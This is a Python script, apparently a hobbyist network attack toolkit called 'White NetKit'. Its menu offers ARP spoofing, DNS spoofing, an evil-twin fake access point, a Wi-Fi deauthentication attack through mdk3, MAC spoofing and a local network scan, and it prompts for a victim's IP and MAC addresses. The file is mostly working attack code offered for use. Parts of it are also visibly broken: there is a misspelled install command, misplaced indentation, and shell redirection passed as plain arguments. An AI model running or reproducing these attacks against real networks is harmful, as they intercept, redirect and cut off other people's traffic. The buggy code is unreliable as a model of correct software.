from scapy.all import *
import sys
import os
import subprocess
import time

os.system("pip install scapy")
os.system("pip intsall scap.all")
os.system("git pull")

os.system("figlet White NetKit")
print('\033[93m' + 'Note : In some area the tool may be used as root user and may require an external wifi adaptor' + '\033[0m')
print("\033[32m================================================================\033[0m")
print("\033[32mTool devoloped : white-eagle\033[0m")
print("\033[33mGithub 	      : https://github.com/WH1T3-E4GL3/\033[0m")
print("\033[33mTelegram       : https://t.me/Ka_KsHi_HaTaKe\033[0m")
print("\033[32m================================================================\033[0m")
print("\n")
print("1.MAC changing \n2.DNS spoofing \n3.ARP spoofing \n4.Fake access point \n5.Deauthentication attack \n6.Find devices connected to your network \n\nSelect the number you want and type it and press enter.")
number = int(input("Enter the number : "))

if number == 1:
    os.system("clear")
    os.system("figlet white mac changer")
    print("\033[32mTool devoloped : white-eagle\033[0m")
    print("\033[33mGithub : https://github.com/WH1T3-E4GL3/\033[0m")
    print("\033[33mTelegram : https://t.me/Ka_KsHi_HaTaKe\033[0m\n")
    interface = input("Enter your network interface : ")
    mac = input("Enter any mac address to spoof : ")
    subprocess.run(["ifconfig", interface, "ether", mac])
elif number == 2:
    os.system("clear")
    os.system("figlet white dns spoof")
    print("\033[32mTool devoloped : white-eagle\033[0m")
    print("\033[33mGithub : https://github.com/WH1T3-E4GL3/\033[0m")
    print("\033[33mTelegram : https://t.me/Ka_KsHi_HaTaKe\033[0m\n")

    def dns_spoof(victim_ip, victim_mac, dns_server_ip, spoofed_ip):
        send(ARP(op=2, pdst=victim_ip, psrc=dns_server_ip, hwdst=victim_mac))
        send(IP(dst=victim_ip, src=dns_server_ip) / UDP(dport=53, sport=53) /
             DNS(rd=1, qd=DNSQR(qname=sys.argv[1], qtype='A', qclass='IN'), an=DNSRR(rrname=sys.argv[1], ttl=10, rdata=spoofed_ip)))
    def main():
        victim_ip = input("Enter the victim's IP address: ")
        victim_mac = input("Enter the victim's MAC address: ")
        dns_server_ip = input("Enter the DNS server IP: ")
        spoofed_ip = input("Enter the spoofed IP: ")
        while True:
            dns_spoof(victim_ip, victim_mac, dns_server_ip, spoofed_ip)
            time.sleep(1)
    if __name__ == "__main__":
        main()
elif number == 3:
    os.system("clear")
    os.system("figlet white arp spoof attack")
    print("\033[32mTool devoloped : white-eagle\033[0m")
    print("\033[33mGithub : https://github.com/WH1T3-E4GL3/\033[0m")
    print("\033[33mTelegram : https://t.me/Ka_KsHi_HaTaKe\033[0m\n")
    def arp_spoof(victim_ip, victim_mac, router_ip, router_mac):
        send(ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst=victim_mac))
        send(ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst=router_mac))
    def main():
        victim_ip = input("Enter the victim's IP address: ")
        victim_mac = input("Enter the victim's MAC address: ")
        router_ip = input("Enter the router IP: ")
        router_mac = input("Enter the router MAC: ")
        while True:
            arp_spoof(victim_ip, victim_mac, router_ip, router_mac)
            time.sleep(1)
    if __name__ == "__main__":
        main()
elif number == 4:
    os.system("figlet evil twin attack")
    print("\033[32mTool devoloped by white-eagle\033[0m")
    print("\033[91m*Note : This tool  can be used to create a fake access point with the specified SSID, password, and interface using hostapd.\033[0m")

    def create_fake_ap(ssid, password, interface):
        conf = """
        interface={}
        driver=nl80211
        ssid={}
        hw_mode=g
        channel=6
        macaddr_acl=0
        auth_algs=1
        ignore_broadcast_ssid=0
        wpa=2
        wpa_passphrase={}
        wpa_key_mgmt=WPA-PSK
        wpa_pairwise=TKIP
        rsn_pairwise=CCMP
        """.format(interface, ssid, password)
    with open("hostapd.conf", "w") as f:
        f.write(conf)
        hostapd = subprocess.Popen(["hostapd", "hostapd.conf"], stdout=subprocess.PIPE)
        time.sleep(5)
        subprocess.call(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", "eth0", "-j", "MASQUERADE"])
        subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
    def main():
        if len(sys.argv) != 4:
            print("Usage: python fake_ap.py [SSID] [password] [interface]")
            sys.exit(0)
        ssid = sys.argv[1]
        password = sys.argv[2]
        interface = sys.argv[3]

        create_fake_ap(ssid, password, interface)

    if __name__ == "__main__":
        main()
elif number == 5:
    os.system("clear")
    os.system("figlet white dns spoof")
    print("\033[32mTool devoloped : white-eagle\033[0m")
    print("\033[33mGithub : https://github.com/WH1T3-E4GL3/\033[0m")
    print("\033[33mTelegram : https://t.me/Ka_KsHi_HaTaKe\033[0m\n")
    wi = input("Enter the wireless interface (e.g. wlan0): ")
    new_mac = input("Enter the new MAC address: ")
    subprocess.run(["apt-key", "adv", "--keyserver", "pgp.mit.edu", "--recv-keys", "ED444FF07D8D0BF6"])
    subprocess.run(["echo", "deb http://http.kali.org/kali kali-rolling main contrib non-free >> /etc/apt/sources.list"])
    subprocess.run(["echo", "deb http://repo.kali.org/kali kali-bleeding-edge main >> /etc/apt/sources.list"])
    subprocess.run(["apt-get", "update"])
    subprocess.run(["apt-get", "install", "-y", "mdk3", "macchanger"])
    print("Done!")
    no_color = "\e[0m"
    white = "\e[0;17m"
    bold_white = "\e[1;37m"
    black = "\e[0;30m"
    blue = "\e[0;34m"
    bold_blue = "\e[1;34m"
    green = "\e[0;32m"
    bold_green = "\e[1;32m"
    cyan = "\e[0;36m"
    bold_cyan = "\e[1;36m"
    red = "\e[0;31m"
    bold_red = "\e[1;31m"
    purple = "\e[0;35m"
    bold_purple = "\e[1;35m"
    brown = "\e[0;33m"
    bold_yellow="\e[1;33m"
    gray="\e[0;37m"
    bold_gray="\e[1;30m"
    def whitexit():
        subprocess.run(["ifconfig", wi, "down"])
        subprocess.run(["macchanger", "-p", wi])
        subprocess.run(["iwconfig", wi, "mode", "managed"])
        subprocess.run(["ifconfig", wi, "up"])
        print(bold_red + "Thanks for using this script")
        print("My GitHub: " + bold_white + "https://github.com/WH1T3-E4GL3" + no_color)
        exit()

    def title():
        print(bold_green + "WHITE-DEAUTHER")
    def getIFCARD():
        print(bold_yellow + "Enter the interface you want to use: " + no_color)
        wi  = input()
        print(bold_yellow + "Enter the MAC you want to use (Or leave blank for random MAC): " + no_color)
        ma = input()
        if ma == "":
            ma = "00:11:22:33:44:55"
        print(bold_yellow + "Enter the BSSID of the access point you want to target: " + no_color)
        bs = input()
        return wi,ma,bs
    def main():
        wi, ma, bs = getIFCARD()
        print(bold_green + "Flushing ARP cache and setting new MAC address..." + no_color)
        subprocess.run(["ifconfig", wi, "down"])
        subprocess.run(["macchanger", "-m", ma, wi])
        subprocess.run(["ifconfig", wi, "up"])
        print(bold_green + "Spoofing MAC address..." + no_color)
        subprocess.run(["mdk3", wi, "a", "-m", "-b", bs])
        print(bold_red + "Press Ctrl+C to stop spoofing")
    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        whitexit()
    if __name__ == "__main__":
        main()
elif number == 6:
    os.system("apt-get install arp-scan")
    os.system("clear")
    os.system("figlet white-arp-scan")
    print("================================================================")
    print("\033[32mTool devoloped by white-eagle\033[0m")
    print("\033[32mGithub   :  https://github.com/WH1T3-E4GL3\033[0m")
    print("\033[32mTelegram : https://t.me/Ka_KsHi_HaTaKe \033[0m")
    print("================================================================")
    def list_devices():
        output = subprocess.run(["arp-scan", "--localnet"], capture_output=True).stdout.decode()
        lines = output.split("\n")
        devices = []
        for line in lines:
            if "\t" in line:
                 parts = line.split("\t")
                 ip_address = parts[0]
                 mac_address = parts[1]
                 name = parts[2]
                 encryption = parts[3]
                 devices.append((name, ip_address, mac_address, encryption))
        return devices
    print(list_devices())    
else:
    print("\033[91mINVALID OPTION PLEASE ENTER THE CORRECT NUMBER FROM ABOVE\033[0m")
